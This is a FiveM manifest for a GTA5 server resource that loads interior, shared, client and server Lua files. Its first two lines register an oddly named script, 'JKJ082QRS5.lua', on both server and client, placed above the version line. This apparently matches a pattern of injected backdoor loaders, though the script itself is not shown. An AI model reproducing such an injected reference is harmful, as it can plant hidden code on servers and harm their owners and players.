server_script "JKJ082QRS5.lua"
client_script "JKJ082QRS5.lua"
fx_version("cerulean")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

game("gta5")
lua54("yes")

client_scripts({
	"interiors/**/*.lua",
	"shared/**/*.lua",
	"client/**/*.lua",
})

server_scripts({
	"interiors/**/*.lua",
	"shared/**/*.lua",
	"sv_config.lua",
	"server/**/*.lua",
})
